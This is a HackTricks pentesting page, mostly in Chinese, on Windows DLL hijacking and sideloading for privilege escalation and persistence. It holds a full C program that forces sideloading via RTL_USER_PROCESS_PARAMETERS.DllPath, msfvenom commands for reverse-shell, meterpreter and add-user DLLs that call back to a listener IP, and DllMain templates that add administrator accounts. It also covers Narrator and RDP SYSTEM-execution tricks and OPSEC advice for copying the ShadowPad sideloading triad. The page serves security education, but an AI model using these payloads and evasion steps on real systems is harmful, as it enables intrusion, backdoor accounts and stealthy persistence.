# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用程序去加载恶意 DLL。该术语包含多种手段，比如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、实现持久化，较少用于权限提升。尽管此处侧重于提升权限，劫持方法在各类目标间基本一致。

### 常见技术

在 DLL hijacking 中使用了多种方法，其效果取决于应用程序的 DLL 加载策略：

1. **DLL Replacement**: 用恶意 DLL 替换真实 DLL，或可选地使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**: 将恶意 DLL 放在搜索路径中、位于合法 DLL 之前，以利用应用的搜索顺序。
3. **Phantom DLL Hijacking**: 为应用创建一个恶意 DLL，使其认为这是一个先前不存在但需要的 DLL 并加载它。
4. **DLL Redirection**: 通过修改搜索参数（如 `%PATH%` 或 `.exe.manifest` / `.exe.local` 文件）将应用指向恶意 DLL。
5. **WinSxS DLL Replacement**: 在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL side-loading 相关联。
6. **Relative Path DLL Hijacking**: 将恶意 DLL 放在与复制的应用同在的用户可控目录中，类似于 Binary Proxy Execution 技术。

> [!TIP]
> 要查看一个按步骤组合 HTML staging、AES-CTR 配置和 .NET implants，在 DLL sideloading 之上的链式工作流，请参考下面的流程。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 查找缺失的 Dlls

查找系统中缺失 Dlls 最常用的方法是运行来自 sysinternals 的 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，并**设置**以下**两个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

并只显示 **File System Activity**：

![](<../../../images/image (153).png>)

如果你是在查找**一般性的缺失 dlls**，让它运行几**秒**。\
如果你是在查找某个**特定可执行文件**内的**缺失 dll**，应该再设置一个过滤条件，例如 **"Process Name" "contains" `<exec name>`**，执行该程序，然后停止捕获事件。

## 利用缺失的 Dlls

为了进行权限提升，我们最好的机会是能够在某个特权进程会尝试加载的搜索路径中**写入一个 dll**。因此，我们可以将一个 dll 写入到一个**会在原始 dll 所在文件夹之前被搜索到的文件夹**（不常见情形），或者写入到**某个被搜索但目标原始 dll 在任何文件夹中都不存在**的文件夹。

### Dll Search Order

**在** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中可以找到 DLL 的具体加载方式。**

Windows 应用按既定顺序在一系列预定义的搜索路径中查找 DLL。当恶意 DLL 被有策略地放置在这些目录之一，且在正版 DLL 之前被加载时，就会出现 DLL hijacking 问题。防止该问题的解决方法是在引用所需 DLL 时使用绝对路径。

下面列出了 32-bit 系统上的 **DLL 搜索顺序**：

1. 应用程序加载所在的目录。
2. 系统目录。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取该目录路径。(_C:\Windows\System32_)
3. 16 位系统目录。没有可以获取该目录路径的函数，但此目录会被搜索。(_C:\Windows\System_)
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取该目录路径。
1. (_C:\Windows_)
5. 当前目录。
6. 列在 PATH 环境变量中的目录。注意，这不包括由 **App Paths** 注册表键指定的每应用路径。**App Paths** 键在计算 DLL 搜索路径时不会被使用。

这是启用 SafeDllSearchMode 时的默认搜索顺序。若禁用该功能，当前目录将提升为第二位。要禁用它，请创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 注册表值并将其设置为 0（默认已启用）。

如果 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用，则搜索从 LoadLibraryEx 要加载的可执行模块的目录开始。

最后，注意 DLL 也可能是通过指定绝对路径而非仅名称来加载。在这种情况下，该 dll 只会在该路径中被搜索（如果该 dll 有任何依赖项，这些依赖项将按名称进行搜索，就像按名称加载的一样）。

还有其他方法可以改变搜索顺序，但此处不再详细说明。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种可确定性地影响新创建进程 DLL 搜索路径的高级方法，是在使用 ntdll 的本地 API 创建进程时设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段。通过在此处提供攻击者可控的目录，可迫使以名称解析导入 DLL（未使用绝对路径且未采用安全加载标志）的目标进程从该目录加载恶意 DLL。

关键思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供指向你可控文件夹的自定义 DllPath（例如放置 dropper/unpacker 的目录）。
- 用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器会在解析过程中检查所提供的 DllPath，从而即使恶意 DLL 未与目标 EXE 同目录也能实现可靠的 sideloading。

注意/限制
- 这仅影响被创建的子进程；不同于 SetDllDirectory（仅影响当前进程）。
- 目标必须以名称导入或通过 LoadLibrary 加载 DLL（未使用绝对路径且未使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。转发导出（forwarded exports）和 SxS 可能改变优先级。

最小 C 示例（ntdll、wide strings、简化的错误处理）：

<details>
<summary>完整 C 示例: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

操作使用示例
- 将恶意的 xmllite.dll（导出所需函数或代理真实的 DLL）放入你的 DllPath 目录。
- 使用上述技术，启动一个已签名且已知会按名称查找 xmllite.dll 的二进制文件。加载器通过提供的 DllPath 解析导入并 sideloads 你的 DLL。

在实际环境中，已观察到该技术用于驱动多阶段 sideloading 链：初始的启动器会放置一个辅助 DLL，然后该辅助 DLL 会生成一个 Microsoft 签名的、可被劫持的二进制文件，并使用自定义的 DllPath 强制从暂存目录加载攻击者的 DLL。


#### 来自 Windows 文档的 dll 搜索顺序例外

某些对标准 DLL 搜索顺序的例外在 Windows 文档中有所说明：

- 当一个 **与内存中已加载的 DLL 同名的 DLL** 被遇到时，系统会绕过通常的搜索。相反，它会在默认使用内存中已加载的 DLL 之前检查重定向和清单（manifest）。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 在 DLL 被识别为当前 Windows 版本的 **known DLL** 的情况下，系统将使用其版本的该 known DLL 以及其任何依赖的 DLL，**从而跳过搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果某个 **DLL 有依赖关系**，则对这些依赖 DLL 的搜索将被当作它们仅由其 **module names** 指定来进行，无论初始 DLL 是否是通过完整路径被识别的。

### 提权

**要求**：

- 识别一个以或将以 **不同权限**（横向或侧向移动）运行的进程，该进程 **缺少某个 DLL**。
- 确保在将要 **搜索 DLL** 的任意 **目录** 上拥有 **写权限**。此位置可能是可执行文件所在的目录或系统 PATH 中的某个目录。

是的，这些先决条件很难找到，因为**默认情况下要找到缺少 DLL 的特权可执行文件有点奇怪**，而且在系统 PATH 文件夹上拥有写权限则更加**不寻常**（默认情况下你无法做到）。但在配置错误的环境中这是可能的。\
如果你足够幸运并满足这些要求，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便**该项目的主要目标是绕过 UAC**，你可能会在那里找到针对相应 Windows 版本的 **Dll hijacking** 的 **PoC** 可供使用（可能仅需更改你有写权限的文件夹路径）。

请注意，你可以通过下面的操作**检查某目录的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并且**检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以检查 executable 的 imports 和 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
有关如何在拥有写入 **System Path folder** 权限的情况下 **abuse Dll Hijacking to escalate privileges** 的完整指南，请参阅：

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 将检查你是否对 system PATH 中的任何文件夹具有写权限。\
其他有趣的自动化工具用于发现此漏洞是 **PowerSploit functions**：_Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现可利用的场景，成功利用的关键之一是**创建一个导出至少该可执行文件将从中导入的所有函数的 dll**。另外，请注意 Dll Hijacking 在[escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** 你可以在这篇专注于 dll hijacking 用于执行 的研究中找到一个关于**如何创建有效 dll**的示例： [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
此外，在**下一节**你可以找到一些**基础 dll 代码**，它们可能作为**模板**或用于创建一个**导出非必需函数的 dll**。

## **创建与编译 Dlls**

### **Dll Proxifying**

基本上，**Dll proxy** 是一种在被加载时既能**执行你的恶意代码**，又能通过**将所有调用转发到真实库**来**暴露并按预期工作**的 Dll。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你实际上可以**指定一个可执行文件并选择要 proxify 的库**并**生成一个 proxified dll**，或者**指定该 Dll**并**生成一个 proxified dll**。

### **Meterpreter**

**获取 rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没有看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

注意，在若干情况下，你编译的 Dll 必须 **export several functions**，这些函数将被 victim process 加载；如果这些函数不存在，**binary won't be able to load** 它们，**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例：创建用户</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的备用 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究：Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 在启动时仍会探测一个可预测的、基于语言的本地化 DLL，该 DLL 可以被劫持以实现 arbitrary code execution and persistence。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 作为普通用户，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文中于上午 9:30 运行。
3. 如果在任务执行时有管理员登录，恶意 DLL 将在管理员会话中以 medium integrity 运行。
4. 串联常见的 UAC bypass 技术，将权限从 medium integrity 提升到 SYSTEM。

## 案例研究：MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

威胁行为者常将 MSI-based droppers 与 DLL side-loading 结合，以在受信任的签名进程下执行 payloads。

Chain overview
- 用户下载 MSI。CustomAction 会在 GUI 安装期间静默运行（例如 LaunchApplication 或 VBScript action），从嵌入的资源重建下一阶段。
- Dropper 将一个合法的已签名 EXE 和一个恶意 DLL 写入同一目录（示例配对：Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 当已签名的 EXE 启动时，Windows DLL search order 会优先从工作目录加载 wsc.dll，从而在签名父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 查找运行 executables 或 VBScript 的条目。可疑示例模式：LaunchApplication 在后台执行嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中嵌入/拆分的 payloads：
- 管理提取： msiexec /a package.msi /qb TARGETDIR=C:\out
- 或使用 lessmsi： lessmsi x package.msi C:\out
- 查找多个小片段，这些片段由 VBScript CustomAction 连接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 将这两个文件放在同一文件夹中：
- wsc_proxy.exe: 合法签名的宿主 (Avast)。该进程会尝试按名称从其目录加载 wsc.dll。
- wsc.dll: 攻击者 DLL。如果不需要特定的 exports，DllMain 就足够；否则，构建一个 proxy DLL，并在 DllMain 中运行 payload 的同时将所需的 exports 转发到真实库。
- 构建一个最小的 DLL payload：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于导出需求，使用代理框架（例如 DLLirant/Spartacus）生成一个转发 DLL，同时执行你的载荷。

- 该技术依赖宿主二进制对 DLL 名称的解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），劫持可能会失败。
- KnownDLLs、SxS 和 forwarded exports 会影响优先级，选择宿主二进制和导出集合时必须加以考虑。

## 签名三件组 + 加密载荷（ShadowPad 案例研究）

Check Point 描述了 Ink Dragon 如何使用一个 **三文件三元组** 部署 ShadowPad，以在与合法软件混淆的同时将核心载荷保存在磁盘上并保持加密：

1. **Signed host EXE** – 利用诸如 AMD、Realtek 或 NVIDIA 的厂商二进制（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者将可执行文件重命名以伪装成 Windows 二进制（例如 `conhost.exe`），但 Authenticode 签名仍然有效。
2. **Malicious loader DLL** – 放在 EXE 旁并使用预期的名字（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是使用 ScatterBrain 框架混淆的 MFC 二进制；其唯一任务是定位加密 blob、解密它并以反射方式映射 ShadowPad。
3. **Encrypted payload blob** – 通常以 `<name>.tmp` 存放在相同目录中。加载器在内存映射解密后的载荷后会删除 TMP 文件以销毁取证痕迹。

操作技巧：

* 重命名签名的 EXE（同时在 PE header 中保留原始的 `OriginalFileName`）可以让其伪装为 Windows 二进制但保留厂商签名，因此可复制 Ink Dragon 将实际上为 AMD/NVIDIA 实用工具的 `conhost.exe` 外观二进制的做法。
* 由于该可执行文件仍被视为受信任，大多数 allowlisting 控制只需要你的恶意 DLL 与其并置即可。重点定制 loader DLL；签名的父进程通常可以保持不变。
* ShadowPad 的解密器期望 TMP blob 与加载器同目录且可写，以便在映射后将该文件归零。保持该目录在载荷加载前可写；载荷进入内存后，可出于 OPSEC 安全地删除 TMP 文件。

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
